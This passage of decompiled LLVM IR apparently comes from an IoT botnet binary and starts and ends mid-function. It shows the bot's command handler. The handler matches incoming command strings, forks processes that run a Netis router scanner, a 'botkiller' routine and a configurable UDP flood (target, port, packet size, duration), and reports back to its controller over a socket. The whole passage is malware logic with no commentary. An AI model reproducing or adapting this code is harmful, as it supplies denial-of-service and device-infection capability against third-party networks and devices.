  %v1_804e519 = icmp eq i32 %v0_804e514, 0
  %v1_804e51b = icmp eq i1 %v1_804e519, false
  br i1 %v1_804e51b, label %dec_label_pc_804f27a, label %dec_label_pc_804e521

dec_label_pc_804e521:                             ; preds = %dec_label_pc_804e514
  %v1_804e521 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e52c = icmp eq i32 %v1_804e521, 0
  br i1 %v4_804e52c, label %dec_label_pc_804e552, label %dec_label_pc_804e535

dec_label_pc_804e535:                             ; preds = %dec_label_pc_804e521
  store i32 %v1_804e521, i32* @global_var_8068810.647, align 16
  br label %dec_label_pc_804f27a

dec_label_pc_804e552:                             ; preds = %dec_label_pc_804e521
  store i1 true, i1* %cf.global-to-local, align 1
  %v0_804e552 = load i32, i32* @global_var_8068808.157, align 8
  %v1_804e55a = call i32 @__GI_inet_ntoa(i32 %v0_804e552)
  %v0_804e55f = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804e55f, i32* %edx.global-to-local, align 4
  %v2_804e574 = call i32 @sockprintf(i32 %v0_804e55f, i32 ptrtoint ([23 x i8]* @global_var_805fbd3.653 to i32))
  %v0_804e579 = call i32 @NetisScanner()
  %v1_804e585 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e58a:                             ; preds = %dec_label_pc_804e4ca, %dec_label_pc_804e3e2
  %v2_804e58d = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e5aa = inttoptr i32 %v2_804e58d to i8*
  store i32 %v2_804e58d, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805fbea.654 to i32), i32* @edi, align 4
  %v7_804e5bc = call i32 @_strncmp(i8* %v4_804e5aa, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805fbea.654, i32 0, i32 0), i32 8)
  %v8_804e5bc = urem i32 %v7_804e5bc, 2
  %v9_804e5bc = icmp eq i32 %v8_804e5bc, 0
  %v0_804e5be = load i1, i1* %cf.global-to-local, align 1
  %v2_804e5be = or i1 %v0_804e5be, %v9_804e5bc
  %v3_804e5be = zext i1 %v2_804e5be to i32
  %v4_804e5be = load i32, i32* %edx.global-to-local, align 4
  %v5_804e5be = and i32 %v4_804e5be, -256
  %v6_804e5be = or i32 %v3_804e5be, %v5_804e5be
  %v7_804e5be = xor i32 %v6_804e5be, 1
  store i32 %v7_804e5be, i32* @edx, align 4
  %v1_804e5c6 = trunc i32 %v7_804e5be to i8
  %v3_804e5c6 = zext i1 %v0_804e5be to i8
  %v15_804e5c6 = icmp eq i8 %v1_804e5c6, %v3_804e5c6
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e5cf = icmp eq i1 %v15_804e5c6, false
  br i1 %v1_804e5cf, label %dec_label_pc_804e612, label %dec_label_pc_804e5d1

dec_label_pc_804e5d1:                             ; preds = %dec_label_pc_804e58a
  %v0_804e5d1 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e5d6 = icmp eq i32 %v0_804e5d1, 0
  %v1_804e5d8 = icmp eq i1 %v1_804e5d6, false
  br i1 %v1_804e5d8, label %dec_label_pc_804e612, label %dec_label_pc_804e5da

dec_label_pc_804e5da:                             ; preds = %dec_label_pc_804e5d1
  %v0_804e5da = load i32, i32* @global_var_8068808.157, align 8
  %v1_804e5e2 = call i32 @__GI_inet_ntoa(i32 %v0_804e5da)
  %v0_804e5e7 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804e5e7, i32* %edx.global-to-local, align 4
  %v2_804e5fc = call i32 @sockprintf(i32 %v0_804e5e7, i32 ptrtoint ([29 x i8]* @global_var_805fbf2.655 to i32))
  %v0_804e601 = call i32 @botkiller()
  %v1_804e60d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e612:                             ; preds = %dec_label_pc_804e5d1, %dec_label_pc_804e58a
  %v2_804e615 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e632 = inttoptr i32 %v2_804e615 to i8*
  store i32 %v2_804e615, i32* @esi, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_805fc0f.656 to i32), i32* @edi, align 4
  %v7_804e644 = call i32 @_strncmp(i8* %v4_804e632, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805fc0f.656, i32 0, i32 0), i32 12)
  %v8_804e644 = urem i32 %v7_804e644, 2
  %v9_804e644 = icmp eq i32 %v8_804e644, 0
  %v0_804e646 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e646 = or i1 %v0_804e646, %v9_804e644
  %v3_804e646 = zext i1 %v2_804e646 to i32
  %v4_804e646 = load i32, i32* @edx, align 4
  %v5_804e646 = and i32 %v4_804e646, -256
  %v6_804e646 = or i32 %v3_804e646, %v5_804e646
  %v7_804e646 = xor i32 %v6_804e646, 1
  store i32 %v7_804e646, i32* %edx.global-to-local, align 4
  %v1_804e64e = trunc i32 %v7_804e646 to i8
  %v3_804e64e = zext i1 %v0_804e646 to i8
  %v15_804e64e = icmp eq i8 %v1_804e64e, %v3_804e64e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e657 = icmp eq i1 %v15_804e64e, false
  br i1 %v1_804e657, label %dec_label_pc_804e685, label %dec_label_pc_804e659

dec_label_pc_804e659:                             ; preds = %dec_label_pc_804e612
  %v0_804e659 = load i32, i32* @global_var_8068808.157, align 8
  %v1_804e661 = call i32 @__GI_inet_ntoa(i32 %v0_804e659)
  %v0_804e666 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804e666, i32* %edx.global-to-local, align 4
  %v2_804e67b = call i32 @sockprintf(i32 %v0_804e666, i32 ptrtoint ([17 x i8]* @global_var_805fc1b.657 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804e685:                             ; preds = %dec_label_pc_804e612
  %v2_804e688 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e6a5 = inttoptr i32 %v2_804e688 to i8*
  store i32 %v2_804e688, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805fc2c.658 to i32), i32* @edi, align 4
  %v7_804e6b7 = call i32 @_strncmp(i8* %v4_804e6a5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805fc2c.658, i32 0, i32 0), i32 4)
  %v8_804e6b7 = urem i32 %v7_804e6b7, 2
  %v9_804e6b7 = icmp eq i32 %v8_804e6b7, 0
  %v0_804e6b9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e6b9 = or i1 %v0_804e6b9, %v9_804e6b7
  %v3_804e6b9 = zext i1 %v2_804e6b9 to i32
  %v4_804e6b9 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e6b9 = and i32 %v4_804e6b9, -256
  %v6_804e6b9 = or i32 %v3_804e6b9, %v5_804e6b9
  %v7_804e6b9 = xor i32 %v6_804e6b9, 1
  store i32 %v7_804e6b9, i32* %edx.global-to-local, align 4
  %v1_804e6c1 = trunc i32 %v7_804e6b9 to i8
  %v3_804e6c1 = zext i1 %v0_804e6b9 to i8
  %v15_804e6c1 = icmp eq i8 %v1_804e6c1, %v3_804e6c1
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e6ca = icmp eq i1 %v15_804e6c1, false
  br i1 %v1_804e6ca, label %dec_label_pc_804e992, label %dec_label_pc_804e6d0

dec_label_pc_804e6d0:                             ; preds = %dec_label_pc_804e685
  %v9_804e6d0 = icmp ult i32 %arg1, 5
  store i1 %v9_804e6d0, i1* %cf.global-to-local, align 1
  %v7_804e6d4 = icmp sgt i32 %arg1, 5
  br i1 %v7_804e6d4, label %dec_label_pc_804e6da, label %dec_label_pc_804e793

dec_label_pc_804e6da:                             ; preds = %dec_label_pc_804e6d0
  %v1_804e6dd = add i32 %tmp189, 12
  %v5_804e6dd = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804e6dd, i1* %cf.global-to-local, align 1
  %v1_804e6e0 = inttoptr i32 %v1_804e6dd to i32*
  %v2_804e6e0 = load i32, i32* %v1_804e6e0, align 4
  %v1_804e6e5 = call i32 @atol(i32 %v2_804e6e0)
  %v5_804e6ea = icmp ne i32 %v1_804e6e5, -1
  store i1 %v5_804e6ea, i1* %cf.global-to-local, align 1
  %v10_804e6ea = icmp eq i32 %v1_804e6e5, -1
  br i1 %v10_804e6ea, label %dec_label_pc_804e793, label %dec_label_pc_804e6f3

dec_label_pc_804e6f3:                             ; preds = %dec_label_pc_804e6da
  %v1_804e6f6 = add i32 %tmp189, 8
  %v5_804e6f6 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804e6f6, i1* %cf.global-to-local, align 1
  %v1_804e6f9 = inttoptr i32 %v1_804e6f6 to i32*
  %v2_804e6f9 = load i32, i32* %v1_804e6f9, align 4
  %v1_804e6fe = call i32 @atol(i32 %v2_804e6f9)
  %v5_804e703 = icmp ne i32 %v1_804e6fe, -1
  store i1 %v5_804e703, i1* %cf.global-to-local, align 1
  %v10_804e703 = icmp eq i32 %v1_804e6fe, -1
  br i1 %v10_804e703, label %dec_label_pc_804e793, label %dec_label_pc_804e70c

dec_label_pc_804e70c:                             ; preds = %dec_label_pc_804e6f3
  %v1_804e70f = add i32 %tmp189, 16
  %v2_804e70f = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804e70f, i1* %cf.global-to-local, align 1
  %v1_804e712 = inttoptr i32 %v1_804e70f to i32*
  %v2_804e712 = load i32, i32* %v1_804e712, align 4
  %v1_804e717 = call i32 @atol(i32 %v2_804e712)
  %v5_804e71c = icmp ne i32 %v1_804e717, -1
  store i1 %v5_804e71c, i1* %cf.global-to-local, align 1
  %v10_804e71c = icmp eq i32 %v1_804e717, -1
  br i1 %v10_804e71c, label %dec_label_pc_804e793, label %dec_label_pc_804e721

dec_label_pc_804e721:                             ; preds = %dec_label_pc_804e70c
  %v1_804e724 = add i32 %tmp189, 20
  %v5_804e724 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804e724, i1* %cf.global-to-local, align 1
  %v1_804e727 = inttoptr i32 %v1_804e724 to i32*
  %v2_804e727 = load i32, i32* %v1_804e727, align 4
  %v1_804e72c = call i32 @atol(i32 %v2_804e727)
  %v5_804e731 = icmp ne i32 %v1_804e72c, -1
  store i1 %v5_804e731, i1* %cf.global-to-local, align 1
  %v10_804e731 = icmp eq i32 %v1_804e72c, -1
  br i1 %v10_804e731, label %dec_label_pc_804e793, label %dec_label_pc_804e736

dec_label_pc_804e736:                             ; preds = %dec_label_pc_804e721
  store i1 %v5_804e724, i1* %cf.global-to-local, align 1
  %v2_804e73c = load i32, i32* %v1_804e727, align 4
  %v1_804e741 = call i32 @atol(i32 %v2_804e73c)
  %v1_804e746 = add i32 %v1_804e741, -65536
  %v2_804e746 = icmp ult i32 %v1_804e741, 65536
  %v3_804e746 = sub i32 65535, %v1_804e741
  %v4_804e746 = and i32 %v3_804e746, %v1_804e741
  %v5_804e746 = icmp slt i32 %v4_804e746, 0
  store i1 %v2_804e746, i1* %cf.global-to-local, align 1
  %v6_804e746 = icmp eq i32 %v1_804e746, 0
  %v7_804e746 = icmp slt i32 %v1_804e746, 0
  %v3_804e74b = icmp eq i1 %v7_804e746, %v5_804e746
  %v4_804e74b = icmp eq i1 %v6_804e746, false
  %v5_804e74b = and i1 %v4_804e74b, %v3_804e74b
  br i1 %v5_804e74b, label %dec_label_pc_804e793, label %dec_label_pc_804e74d

dec_label_pc_804e74d:                             ; preds = %dec_label_pc_804e736
  store i1 %v5_804e724, i1* %cf.global-to-local, align 1
  %v2_804e753 = load i32, i32* %v1_804e727, align 4
  %v1_804e758 = call i32 @atol(i32 %v2_804e753)
  %v1_804e75d = add i32 %v1_804e758, -65500
  %v5_804e75d = icmp ult i32 %v1_804e758, 65500
  %v6_804e75d = sub i32 65499, %v1_804e758
  %v7_804e75d = and i32 %v6_804e75d, %v1_804e758
  %v8_804e75d = icmp slt i32 %v7_804e75d, 0
  store i1 %v5_804e75d, i1* %cf.global-to-local, align 1
  %v9_804e75d = icmp eq i32 %v1_804e75d, 0
  %v10_804e75d = icmp slt i32 %v1_804e75d, 0
  %v3_804e762 = icmp eq i1 %v10_804e75d, %v8_804e75d
  %v4_804e762 = icmp eq i1 %v9_804e75d, false
  %v5_804e762 = and i1 %v4_804e762, %v3_804e762
  br i1 %v5_804e762, label %dec_label_pc_804e793, label %dec_label_pc_804e764

dec_label_pc_804e764:                             ; preds = %dec_label_pc_804e74d
  store i1 %v2_804e70f, i1* %cf.global-to-local, align 1
  %v2_804e76a = load i32, i32* %v1_804e712, align 4
  %v1_804e76f = call i32 @atol(i32 %v2_804e76a)
  %v1_804e774 = add i32 %v1_804e76f, -32
  %v2_804e774 = icmp ult i32 %v1_804e76f, 32
  %v3_804e774 = sub i32 31, %v1_804e76f
  %v4_804e774 = and i32 %v3_804e774, %v1_804e76f
  %v5_804e774 = icmp slt i32 %v4_804e774, 0
  store i1 %v2_804e774, i1* %cf.global-to-local, align 1
  %v6_804e774 = icmp eq i32 %v1_804e774, 0
  %v7_804e774 = icmp slt i32 %v1_804e774, 0
  %v3_804e777 = icmp eq i1 %v7_804e774, %v5_804e774
  %v4_804e777 = icmp eq i1 %v6_804e774, false
  %v5_804e777 = and i1 %v4_804e777, %v3_804e777
  br i1 %v5_804e777, label %dec_label_pc_804e793, label %dec_label_pc_804e779

dec_label_pc_804e779:                             ; preds = %dec_label_pc_804e764
  %v8_804e779 = icmp ult i32 %arg1, 7
  store i1 %v8_804e779, i1* %cf.global-to-local, align 1
  %v12_804e779 = icmp eq i32 %arg1, 7
  %v1_804e77d = icmp eq i1 %v12_804e779, false
  br i1 %v1_804e77d, label %dec_label_pc_804e7ad, label %dec_label_pc_804e77f

dec_label_pc_804e77f:                             ; preds = %dec_label_pc_804e779
  %v1_804e782 = add i32 %tmp189, 24
  %v5_804e782 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804e782, i1* %cf.global-to-local, align 1
  %v1_804e785 = inttoptr i32 %v1_804e782 to i32*
  %v2_804e785 = load i32, i32* %v1_804e785, align 4
  %v1_804e78a = call i32 @atol(i32 %v2_804e785)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp196 = icmp slt i32 %v1_804e78a, 1
  %tmp197 = icmp eq i1 %tmp196, false
  br i1 %tmp197, label %dec_label_pc_804e7ad, label %dec_label_pc_804e793

dec_label_pc_804e793:                             ; preds = %dec_label_pc_804e6d0, %dec_label_pc_804e77f, %dec_label_pc_804e764, %dec_label_pc_804e74d, %dec_label_pc_804e736, %dec_label_pc_804e721, %dec_label_pc_804e70c, %dec_label_pc_804e6f3, %dec_label_pc_804e6da
  %v0_804e793 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e7a3 = call i32 @sockprintf(i32 %v0_804e793, i32 ptrtoint ([113 x i8]* @global_var_805fc30.659 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804e7ad:                             ; preds = %dec_label_pc_804e77f, %dec_label_pc_804e779
  %v1_804e7b0 = add i32 %tmp189, 4
  %v1_804e7b3 = inttoptr i32 %v1_804e7b0 to i32*
  %v2_804e7b3 = load i32, i32* %v1_804e7b3, align 4
  store i1 %v5_804e6f6, i1* %cf.global-to-local, align 1
  %v2_804e7be = load i32, i32* %v1_804e6f9, align 4
  %v1_804e7c3 = call i32 @atol(i32 %v2_804e7be)
  store i1 %v5_804e6dd, i1* %cf.global-to-local, align 1
  %v2_804e7d1 = load i32, i32* %v1_804e6e0, align 4
  %v1_804e7d6 = call i32 @atol(i32 %v2_804e7d1)
  store i1 %v2_804e70f, i1* %cf.global-to-local, align 1
  %v2_804e7e4 = load i32, i32* %v1_804e712, align 4
  %v1_804e7e9 = call i32 @atol(i32 %v2_804e7e4)
  store i1 %v5_804e724, i1* %cf.global-to-local, align 1
  %v2_804e7f7 = load i32, i32* %v1_804e727, align 4
  %v1_804e7fc = call i32 @atol(i32 %v2_804e7f7)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e808 = icmp sgt i32 %arg1, 6
  br i1 %v7_804e808, label %dec_label_pc_804e82c, label %dec_label_pc_804e82c.thread

dec_label_pc_804e82c.thread:                      ; preds = %dec_label_pc_804e7ad
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804e779, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e85d

dec_label_pc_804e82c:                             ; preds = %dec_label_pc_804e7ad
  %v1_804e80d = add i32 %tmp189, 24
  %v5_804e80d = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804e80d, i1* %cf.global-to-local, align 1
  %v1_804e810 = inttoptr i32 %v1_804e80d to i32*
  %v2_804e810 = load i32, i32* %v1_804e810, align 4
  %v1_804e815 = call i32 @atol(i32 %v2_804e810)
  store i32 %v1_804e815, i32* @esi, align 4
  store i1 %v8_804e779, i1* %cf.global-to-local, align 1
  %v7_804e839 = icmp eq i32 %arg1, 7
  br i1 %v7_804e839, label %dec_label_pc_804e85d, label %dec_label_pc_804e83b

dec_label_pc_804e83b:                             ; preds = %dec_label_pc_804e82c
  %v1_804e83e = add i32 %tmp189, 28
  %v5_804e83e = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804e83e, i1* %cf.global-to-local, align 1
  %v1_804e841 = inttoptr i32 %v1_804e83e to i32*
  %v2_804e841 = load i32, i32* %v1_804e841, align 4
  %v1_804e846 = call i32 @atol(i32 %v2_804e841)
  br label %dec_label_pc_804e85d

dec_label_pc_804e85d:                             ; preds = %dec_label_pc_804e82c, %dec_label_pc_804e82c.thread, %dec_label_pc_804e83b
  %storemerge10208 = phi i32 [ %v1_804e815, %dec_label_pc_804e83b ], [ %v1_804e815, %dec_label_pc_804e82c ], [ 1000, %dec_label_pc_804e82c.thread ]
  %storemerge9 = phi i32 [ %v1_804e846, %dec_label_pc_804e83b ], [ 1000000, %dec_label_pc_804e82c ], [ 1000000, %dec_label_pc_804e82c.thread ]
  store i32 %storemerge9, i32* @edi, align 4
  %v9_804e866 = icmp ult i32 %arg1, 8
  store i1 %v9_804e866, i1* %cf.global-to-local, align 1
  %v7_804e86a = icmp sgt i32 %arg1, 8
  br i1 %v7_804e86a, label %dec_label_pc_804e86c, label %dec_label_pc_804e88e

dec_label_pc_804e86c:                             ; preds = %dec_label_pc_804e85d
  %v1_804e86f = add i32 %tmp189, 32
  %v2_804e86f = icmp ugt i32* %arg2, inttoptr (i32 -33 to i32*)
  store i1 %v2_804e86f, i1* %cf.global-to-local, align 1
  %v1_804e872 = inttoptr i32 %v1_804e86f to i32*
  %v2_804e872 = load i32, i32* %v1_804e872, align 4
  %v1_804e877 = call i32 @atol(i32 %v2_804e872)
  %phitmp = sext i32 %v1_804e877 to i64
  br label %dec_label_pc_804e88e

dec_label_pc_804e88e:                             ; preds = %dec_label_pc_804e85d, %dec_label_pc_804e86c
  %storemerge8 = phi i64 [ %phitmp, %dec_label_pc_804e86c ], [ 0, %dec_label_pc_804e85d ]
  %v2_804e8a5 = inttoptr i32 %v2_804e7b3 to i8*
  %v3_804e8a5 = call i32 @__GI_strchr(i8* %v2_804e8a5, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8aa = icmp eq i32 %v3_804e8a5, 0
  br i1 %v1_804e8aa, label %dec_label_pc_804e93d, label %dec_label_pc_804e8b2

dec_label_pc_804e8b2:                             ; preds = %dec_label_pc_804e88e
  store i32 %v2_804e7b3, i32* @eax, align 4
  %v2_804e8c0 = call i32 @__GI_strtok(i32 %v2_804e7b3, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e93255 = icmp eq i32 %v2_804e8c0, 0
  %v1_804e93662 = icmp eq i1 %v4_804e93255, false
  br i1 %v1_804e93662, label %dec_label_pc_804e8ca, label %dec_label_pc_804f27a

dec_label_pc_804e8ca:                             ; preds = %dec_label_pc_804e8b2, %dec_label_pc_804e91b
  %storemerge1163 = phi i32 [ %v2_804e92a, %dec_label_pc_804e91b ], [ %v2_804e8c0, %dec_label_pc_804e8b2 ]
  %v0_804e8ca = call i32 @listFork()
  store i32 %v0_804e8ca, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8cf = icmp eq i32 %v0_804e8ca, 0
  %v1_804e8d1 = icmp eq i1 %v1_804e8cf, false
  br i1 %v1_804e8d1, label %dec_label_pc_804e91b, label %dec_label_pc_804e8d3

dec_label_pc_804e8d3:                             ; preds = %dec_label_pc_804e8ca
  %v9_804e90a = call i32 @sendUDP(i32 %storemerge1163, i32 %v1_804e7c3, i32 %v1_804e7d6, i32 %v1_804e7e9, i32 %v1_804e7fc, i32 %storemerge10208, i32 %storemerge9, i64 %storemerge8)
  %v1_804e916 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e91b:                             ; preds = %dec_label_pc_804e8ca
  %v2_804e92a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e932 = icmp eq i32 %v2_804e92a, 0
  %v1_804e936 = icmp eq i1 %v4_804e932, false
  br i1 %v1_804e936, label %dec_label_pc_804e8ca, label %dec_label_pc_804f27a

dec_label_pc_804e93d:                             ; preds = %dec_label_pc_804e88e
  %v0_804e93d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e942 = icmp eq i32 %v0_804e93d, 0
  %v1_804e944 = icmp eq i1 %v1_804e942, false
  br i1 %v1_804e944, label %dec_label_pc_804f27a, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e93d
  %v9_804e981 = call i32 @sendUDP(i32 %v2_804e7b3, i32 %v1_804e7c3, i32 %v1_804e7d6, i32 %v1_804e7e9, i32 %v1_804e7fc, i32 %storemerge10208, i32 %storemerge9, i64 %storemerge8)
  %v1_804e98d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e992:                             ; preds = %dec_label_pc_804e685
  %v2_804e995 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e9b2 = inttoptr i32 %v2_804e995 to i8*
  store i32 %v2_804e995, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805fca1.660 to i32), i32* @edi, align 4
  %v7_804e9c4 = call i32 @_strncmp(i8* %v4_804e9b2, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805fca1.660, i32 0, i32 0), i32 4)
  %v8_804e9c4 = urem i32 %v7_804e9c4, 2
  %v9_804e9c4 = icmp eq i32 %v8_804e9c4, 0
  %v0_804e9c6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e9c6 = or i1 %v0_804e9c6, %v9_804e9c4
  %v3_804e9c6 = zext i1 %v2_804e9c6 to i32
  %v4_804e9c6 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e9c6 = and i32 %v4_804e9c6, -256
  %v6_804e9c6 = or i32 %v3_804e9c6, %v5_804e9c6
  %v7_804e9c6 = xor i32 %v6_804e9c6, 1
  store i32 %v7_804e9c6, i32* @edx, align 4
  %v1_804e9ce = trunc i32 %v7_804e9c6 to i8
  %v3_804e9ce = zext i1 %v0_804e9c6 to i8
  %v15_804e9ce = icmp eq i8 %v1_804e9ce, %v3_804e9ce
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e9d7 = icmp eq i1 %v15_804e9ce, false
  br i1 %v1_804e9d7, label %dec_label_pc_804ec20, label %dec_label_pc_804e9dd

dec_label_pc_804e9dd:                             ; preds = %dec_label_pc_804e992
  %v9_804e9dd = icmp ult i32 %arg1, 5
  store i1 %v9_804e9dd, i1* %cf.global-to-local, align 1
  %v7_804e9e1 = icmp sgt i32 %arg1, 5
  br i1 %v7_804e9e1, label %dec_label_pc_804e9e7, label %dec_label_pc_804ea6f

dec_label_pc_804e9e7:                             ; preds = %dec_label_pc_804e9dd
  %v1_804e9ea = add i32 %tmp189, 12
  %v5_804e9ea = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804e9ea, i1* %cf.global-to-local, align 1
  %v1_804e9ed = inttoptr i32 %v1_804e9ea to i32*
  %v2_804e9ed = load i32, i32* %v1_804e9ed, align 4
  %v1_804e9f2 = call i32 @atol(i32 %v2_804e9ed)
  %v5_804e9f7 = icmp ne i32 %v1_804e9f2, -1
  store i1 %v5_804e9f7, i1* %cf.global-to-local, align 1
  %v10_804e9f7 = icmp eq i32 %v1_804e9f2, -1
  br i1 %v10_804e9f7, label %dec_label_pc_804ea6f, label %dec_label_pc_804e9fc

dec_label_pc_804e9fc:                             ; preds = %dec_label_pc_804e9e7
  %v1_804e9ff = add i32 %tmp189, 8
  %v5_804e9ff = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804e9ff, i1* %cf.global-to-local, align 1
  %v1_804ea02 = inttoptr i32 %v1_804e9ff to i32*
  %v2_804ea02 = load i32, i32* %v1_804ea02, align 4
  %v1_804ea07 = call i32 @atol(i32 %v2_804ea02)
  %v5_804ea0c = icmp ne i32 %v1_804ea07, -1
  store i1 %v5_804ea0c, i1* %cf.global-to-local, align 1
  %v10_804ea0c = icmp eq i32 %v1_804ea07, -1
  br i1 %v10_804ea0c, label %dec_label_pc_804ea6f, label %dec_label_pc_804ea11

dec_label_pc_804ea11:                             ; preds = %dec_label_pc_804e9fc
  %v1_804ea14 = add i32 %tmp189, 16
  %v2_804ea14 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804ea14, i1* %cf.global-to-local, align 1
  %v1_804ea17 = inttoptr i32 %v1_804ea14 to i32*
  %v2_804ea17 = load i32, i32* %v1_804ea17, align 4
  %v1_804ea1c = call i32 @atol(i32 %v2_804ea17)
  %v5_804ea21 = icmp ne i32 %v1_804ea1c, -1
  store i1 %v5_804ea21, i1* %cf.global-to-local, align 1
  %v10_804ea21 = icmp eq i32 %v1_804ea1c, -1
  br i1 %v10_804ea21, label %dec_label_pc_804ea6f, label %dec_label_pc_804ea26

dec_label_pc_804ea26:                             ; preds = %dec_label_pc_804ea11
  store i1 %v2_804ea14, i1* %cf.global-to-local, align 1
  %v2_804ea2c = load i32, i32* %v1_804ea17, align 4
  %v1_804ea31 = call i32 @atol(i32 %v2_804ea2c)
  %v1_804ea36 = add i32 %v1_804ea31, -32
  %v2_804ea36 = icmp ult i32 %v1_804ea31, 32
  %v3_804ea36 = sub i32 31, %v1_804ea31
  %v4_804ea36 = and i32 %v3_804ea36, %v1_804ea31
  %v5_804ea36 = icmp slt i32 %v4_804ea36, 0
  store i1 %v2_804ea36, i1* %cf.global-to-local, align 1
  %v6_804ea36 = icmp eq i32 %v1_804ea36, 0
  %v7_804ea36 = icmp slt i32 %v1_804ea36, 0
  %v3_804ea39 = icmp eq i1 %v7_804ea36, %v5_804ea36
  %v4_804ea39 = icmp eq i1 %v6_804ea36, false
  %v5_804ea39 = and i1 %v4_804ea39, %v3_804ea39
  br i1 %v5_804ea39, label %dec_label_pc_804ea6f, label %dec_label_pc_804ea3b

dec_label_pc_804ea3b:                             ; preds = %dec_label_pc_804ea26
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ea3f = icmp sgt i32 %arg1, 6
  br i1 %v7_804ea3f, label %dec_label_pc_804ea41, label %dec_label_pc_804ea55

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804ea3b
  %v1_804ea44 = add i32 %tmp189, 24
  %v5_804ea44 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804ea44, i1* %cf.global-to-local, align 1
  %v1_804ea47 = inttoptr i32 %v1_804ea44 to i32*
  %v2_804ea47 = load i32, i32* %v1_804ea47, align 4
  %v1_804ea4c = call i32 @atol(i32 %v2_804ea47)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804ea51 = icmp slt i32 %v1_804ea4c, 0
  br i1 %v2_804ea51, label %dec_label_pc_804ea6f, label %dec_label_pc_804ea55

dec_label_pc_804ea55:                             ; preds = %dec_label_pc_804ea3b, %dec_label_pc_804ea41
  %v8_804ea55 = icmp ult i32 %arg1, 8
  store i1 %v8_804ea55, i1* %cf.global-to-local, align 1
  %v12_804ea55 = icmp eq i32 %arg1, 8
  %v1_804ea59 = icmp eq i1 %v12_804ea55, false
  br i1 %v1_804ea59, label %dec_label_pc_804ea89, label %dec_label_pc_804ea5b

dec_label_pc_804ea5b:                             ; preds = %dec_label_pc_804ea55
  %v1_804ea5e = add i32 %tmp189, 28
  %v5_804ea5e = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804ea5e, i1* %cf.global-to-local, align 1
  %v1_804ea61 = inttoptr i32 %v1_804ea5e to i32*
  %v2_804ea61 = load i32, i32* %v1_804ea61, align 4
  %v1_804ea66 = call i32 @atol(i32 %v2_804ea61)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp198 = icmp slt i32 %v1_804ea66, 1
  %tmp199 = icmp eq i1 %tmp198, false
  br i1 %tmp199, label %dec_label_pc_804ea89, label %dec_label_pc_804ea6f

dec_label_pc_804ea6f:                             ; preds = %dec_label_pc_804e9dd, %dec_label_pc_804ea5b, %dec_label_pc_804ea41, %dec_label_pc_804ea26, %dec_label_pc_804ea11, %dec_label_pc_804e9fc, %dec_label_pc_804e9e7
  %v0_804ea6f = load i32, i32* @global_var_8062580.20, align 128
